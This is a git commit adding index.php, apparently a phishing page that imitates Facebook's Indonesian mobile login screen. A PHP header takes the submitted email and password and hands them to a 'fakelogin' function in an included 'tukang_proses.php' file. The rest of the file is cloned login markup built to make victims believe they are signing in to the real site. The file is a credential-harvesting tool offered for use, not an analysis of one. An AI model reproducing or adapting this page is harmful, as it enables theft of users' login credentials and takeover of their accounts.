ed94a03624ee86ae1ed1b1ad257578429a3c3920
mr12project <139981426+mr12project@users.noreply.github.com>
2023-07-19 20:17:02 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,234 @@
+
+<?php
+include "tukang_proses.php";
+
+if(isset($_POST["login"])){
+$unm=$_POST["email"];
+$pss=$_POST["pass"];
+fakelogin($unm,$pss);
+die();
+}
+
+
+?>
+
+
+<html>
+<head>
+  <title>zzzz- Masuk atau Daftar</title>
+  <meta name="theme-color" content="#3b5998">
+  <meta name="msapplication-navbutton-color" content="#3b5998">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#3b5998">
+  
+  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+  <link href="xxxxx" rel="shortcut icon" sizes="196x196">
+  
+  <link type="text/css" rel="stylesheet" href="thm-style/cloned_one.css">
+  
+  <link type="text/css" rel="stylesheet" href="thm-style/cloned_two.css"> 
+  
+  <meta name="description" content="Buat akun atau masuk ke zzz. Terhubunglah dengan teman, keluarga, dan orang lain yang Anda kenal. Bagikan foto dan video, kirim pesa, dan dapatkan...">
+  
+  <link rel="canonical" href="Xxxxxxx"> 
+  
+ </head>
+ <body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="min-height: 557px; background-color: rgb(255, 255, 255);"> 
+ 
+  <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 557px;">
+   <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Fak</h1>
+   
+   <div id="page" class="">
+    <div class="_129_" id="header-notices"></div>
+    <div class="_7om2 _52we _52z5" id="header"><div class="dfg" style="background-color: none; height: 25px; margin: 0px auto; text-align: center;margin-left:30%; font-size: 25px;padding-top:10px;"><p style="color:white; margin:0px auto; text-align:center;font-style: bold;"><b>Faaacebook</b></p></div>
+     <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
+      <a href="XXXXX"><i class="img
+      sp_7XcGHqCocZi sx_75894"><u><h2>yayaya</h2></u></i></a>
+      
+     </div>
+    </div>
+    <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 557px;">
+     <div class="_7om2">
+      <div class="_4g34" id="u_0_0">
+      <img src="XXXXX" style="display:none">
+       
+       <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
+        <div class="_52jd"></div>
+       </div>
+       <div class="aclb _4-4l">
+        <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
+         <div class="_qw9 grouped aclb" id="u_0_1">
+          <a href="XXXXX" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
+           <div class="ib cc">
+            <i class="XXZZ2"></i>
+            <div class="c">
+             <span class="fcl">Pasang facebook untuk Android dan buka lebih cepat.</span>
+            </div>
+           </div></a>
+         </div>
+         <iframe style="display: none;"></iframe>
+        </div>
+        <div class="_5rut">
+         <form method="post" action=" " class="mobile-login-form _5spm" id="login_form" novalidate="1" data-autoid="autoid_2">
+           <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
+          <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
+          <div id="otp_retrieve_desc_container"></div>
+          <div class="_56be _5sob">
+           <div class="_55wo _55x2 _56bf">
+            <div id="email_input_container">
+             <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" autocomplete="off" id="m_login_email" name="email" placeholder="Nomor ponsel atau email" data-sigil="m_login_email">
+            </div>
+            <div>
+             <div class="_1upc _mg8" data-sigil="m_login_password">
+              <div class="_7om2">
+               <div class="_4g34 _5i2i _52we">
+                <div class="_5xu4">
+                 <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="off" id="m_login_password" name="pass" placeholder="Kata Sandi" type="password" data-sigil="password-plain-text-toggle-input">
+                </div>
+                <div></div>
+               </div>
+               <div class="_5s61 _216i _5i2i _52we">
+                <div class="_5xu4">
+                 <div class="_2pi9" style="display:none" id="u_0_2">
+                  <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3">SEMBUNYIKAN</span><span class="mfss" id="u_0_4">PERLIHATKAN</span></a>
+                 </div>
+                </div>
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="_2pie" style="text-align:center;">
+           <div id="u_0_5" data-sigil="login_password_step_element">
+            <button  value="Masuk" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_6" data-autoid="autoid_4"><span class="_55sr">Masuk</span></button>
+           </div>
+           <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
+           <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
+           <div id="otp_button_elem_container"></div>
+          </div>
+          <input type="hidden" name="prefill_contact_point" id="prefill_contact_point">
+          <input type="hidden" name="prefill_source" id="prefill_source">
+          <input type="hidden" name="prefill_type" id="prefill_type">
+          <input type="hidden" name="first_prefill_source" id="first_prefill_source">
+          <input type="hidden" name="first_prefill_type" id="first_prefill_type">
+          <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false">
+          <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false">
+          <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false">
+          <div class="_xo8"></div>
+          <noscript>
+           &lt;input type="hidden" name="_fb_noscript" value="true" /&gt;
+          </noscript>
+         </form>
+         <div>
+          <div class="_43mg">
+           <span class="_43mh">atau</span>
+          </div>
+          <div class="_52jj _5t3b" id="u_0_7">
+           <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Buat Akun Baru</a>
+          </div>
+         </div>
+         <div>
+          <div class="other-links">
+           <ul class="_5pkb _55wp">
+            <li><span class="mfss fcg"><a tabindex="0" href="index.php">Lupa Kata Sandi?</a><span aria-hidden="true"> · </span><a href="index.php" idow ="help-link" class="sec">Pusat Bantuan</a></span></li>
+           </ul>
+          </div>
+         </div>
+        </div>
+        <div></div>
+       </div>
+      </div>
+     </div>
+     <div>
+      <div>
+       <iframe id="u_0_8" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src=""></iframe>
+       <iframe id="u_0_9" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src="/common/referer_frame.php"></iframe>
+      </div>
+     </div>
+     <span><img src="" width="0" height="0" style="display:none"></span>
+     <div class="_55wr _5ui2" data-sigil="m_login_footer">
+      <div class="_5dpw">
+       <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
+        <div class="_7om2">
+         <div class="_4g34">
+          <span class="_52jc _52j9 _52jh _3ztb">Bahasa Indonesia</span>
+          <div class="_3ztc">
+           <span class="_52jc"><a href="" data-locale="jv_ID" data-sigil="change_language">Basa Jawa</a></span>
+          </div>
+          <div class="_3ztc">
+           <span class="_52jc"><a href="" data-locale="ja_JP" data-sigil="change_language">日本語</a></span>
+          </div>
+          <div class="_3ztc">
+           <span class="_52jc"><a href="#" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span>
+          </div>
+         </div>
+         <div class="_4g34">
+          <div class="_3ztc">
+           <span class="_52jc"><a href="" data-locale="en_GB" data-sigil="change_language">English (UK)</a></span>
+          </div>
+          <div class="_3ztc">
+           <span class="_52jc"><a href=" " data-locale="ms_MY" data-sigil="change_language">Bahasa Melayu</a></span>
+          </div>
+          <div class="_3ztc">
+           <span class="_52jc"><a href="" data-locale="es_LA" data-sigil="change_language">Español</a></span>
+          </div>
+          <a href="">
+           <div class="_3j87 _1rrd _3ztd" aria-label="Daftar bahasa lengkap" data-sigil="more_language">
+            <i class="img sp_7XcGHqCocZi sx_99315f"></i>
+           </div></a>
+         </div>
+        </div>
+       </div>
+       <div class="_5ui4">
+        <span class="mfss fcg">zzzzz © 2019</span>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class=""></div>
+    <div class="viewportArea _2v9s" style="display:none" id="u_0_a" data-sigil="marea">
+     <div class="_5vsg" id="u_0_b" style="max-height: 180px;"></div>
+     <div class="_5vsh" id="u_0_c" style="max-height: 278px;"></div>
+     <div class="_5v5d fcg">
+      <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil=""></div>Memuat...
+     </div>
+    </div>
+    <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
+     <div class="container">
+      <div class="image"></div>
+      <div class="message" data-sigil="error-message"></div>
+      <a class="link" data-sigil="MPageError:retry">Coba Lagi</a>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="static_templates">
+   <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
+    <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+     <div class="_7om2 _52we">
+      <div class="_5s61">
+       <div class="_52z7">
+        <button type="submit" value="Batalkan" class="cancelButton btn btnD bgb mfss touchable" id="u_0_e" data-sigil="dialog-cancel-button">Batalkan</button>
+        <button type="submit" value="Kembali" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Kembali" id="u_0_f" data-sigil="dialog-back-button"><i class="img sp_7XcGHqCocZi sx_e901c0" style="margin-top: 2px;"></i></button>
+       </div>
+      </div>
+      <div class="_4g34">
+       <div class="_52z6">
+        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="Xxxxx">
+         Memuat...
+        </div>
+       </div>
+      </div>
+      <div class="_5s61">
+       <div class="_52z8" id="modalDialogHeaderButtons"></div>
+      </div>
+     </div>
+    </div>
+    <div class="modalDialogView" id="modalDialogView"></div>
+    <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+     <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_d" data-sigil=""></div>Memuat...
+    </div>
+   </div>
+  </div> 
+ </body>
+</html>
